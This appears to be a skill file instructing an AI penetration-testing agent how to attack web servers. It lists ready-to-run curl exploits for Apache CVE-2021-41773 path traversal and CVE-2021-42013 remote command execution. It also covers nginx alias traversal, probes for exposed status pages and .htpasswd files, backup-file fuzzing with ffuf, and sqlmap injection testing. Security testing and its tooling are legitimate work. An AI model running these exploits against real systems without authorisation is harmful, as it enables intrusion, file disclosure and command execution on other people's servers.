---
name: svc-web-server
description: Web SERVER software (not app-layer) attack techniques — server misconfigs, known server CVEs, path traversal, exposed status/config. Use when you fingerprint the web server itself (for app-layer bugs use the web-<class> skills). Triggers - Server header, Apache 2.4.49/2.4.50, nginx alias traversal, IIS, Tomcat, /server-status, .htaccess.
---

# Web Server Attack Reference

## Apache
### Critical CVEs
- **CVE-2021-41773** (Apache 2.4.49): Path traversal via `curl 'http://<t>/cgi-bin/.%2e/%2e%2e/etc/passwd'`
- **CVE-2021-42013** (Apache 2.4.49-50): RCE via `curl 'http://<t>/cgi-bin/.%%32%65/.%%32%65/bin/sh' -d 'echo;id'`
- **CVE-2019-0211** (Apache 2.4.17-2.4.38): Local privesc via scoreboard manipulation
- **CVE-2017-9798** (Optionsbleed): `curl -sI -X OPTIONS http://<t>/` — leaks memory

### Misconfigurations
```bash
# Server-status exposure
curl http://<t>/server-status
curl http://<t>/server-info

# .htaccess / .htpasswd readable
curl http://<t>/.htaccess
curl http://<t>/.htpasswd

# Directory listing
curl http://<t>/icons/
```

## Nginx
### CVEs
- **CVE-2017-7529** (Nginx <1.13.2): Integer overflow → info disclosure
- **CVE-2021-23017**: DNS resolver off-by-one heap write

### Misconfigurations
```bash
# Alias traversal (missing trailing slash)
curl http://<t>/static../etc/passwd

# stub_status exposure
curl http://<t>/nginx_status
curl http://<t>/status

# Off-by-slash
# If: location /folder { alias /var/www/; }
# Then: /folder../etc/passwd works
```

## IIS
### CVEs
- **CVE-2017-7269** (IIS 6.0): WebDAV buffer overflow → RCE
- **CVE-2021-31166** (HTTP.sys): Wormable RCE via malformed header

### Checks
```bash
# Short filename disclosure
curl http://<t>/~1/
# WebDAV methods
curl -X OPTIONS http://<t>/ -sI | grep -i allow
```

## General Web Server Checks
```bash
# Technology detection
whatweb http://<t> -a 3
curl -sI http://<t>   # single header dump is fine
```

Backup-file and sensitive-path checks: do these with `ffuf`/`gobuster`, NOT a `curl`
bash-loop. Put the candidate paths in a file and fuzz once:

```bash
# sensitive/backup paths in one run, then parse
cat > paths.txt <<'EOF'
.git/HEAD
.env
.DS_Store
web.config
wp-config.php.bak
robots.txt
sitemap.xml
index.php.bak
index.php.old
index.php.orig
index.php~
EOF
ffuf -w paths.txt -u http://<t>/FUZZ -mc 200,301,302,401,403 -maxtime 100 -o ffuf.json -of json
# then (separate command): gobuster_parse on the results
```

A `for ext in bak old ...; do curl ...; done` loop is the WRONG pattern — use the ffuf
run above. If ffuf/gobuster is missing, install it (`apt install -y ffuf gobuster`)
rather than looping curl.

## Authenticated testing
Needing a session cookie/header is NOT a reason to hand-run curl — every tool carries auth:
- ffuf `-H "Cookie: ..."` / `-b`, gobuster `--cookies`, nuclei `-H`, sqlmap `--cookie=`, feroxbuster `-H`.
- A single `curl -b` is only for a one-off PoC, never "curl for all requests".

## Injection (SQLi) → sqlmap, not by hand
- Detect with sqlmap (blind/time/union coverage, true/false differential), then `sqlmap_parse`.
- Non-standard transport (Next.js Server Actions / RSC, custom `Next-Action` / `text/x-component`):
  ONE recon `curl` to confirm the param reacts is allowed, then move detection to a saved request:
  `sqlmap -r request.txt -p <param> --batch` → `sqlmap_parse`. No manual `' OR 1=1` sweeps.

## Long-running fuzz
- Add `-maxtime N` (below the shell timeout) so `ffuf -o json` flushes on a clean exit before it's killed.
- Run long fuzzes backgrounded / with a raised timeout; run the fuzz and `gobuster_parse` as SEPARATE commands.
- Drop `-s` (see progress). If throttled, LOWER `-t` and add `-p 0.1`.

## Output Rules
- Never curl-loop over paths — that's what ffuf/gobuster are for. Single `curl` only for one-off requests.
- For gobuster/ffuf: use `-q -n --no-error` or `-mc` match codes to suppress noise, then `gobuster_parse`.
- Redirect large output to files. Never paste >50 lines of raw tool output.
- Use `gobuster_parse` and `nuclei_parse` for auto-processing.
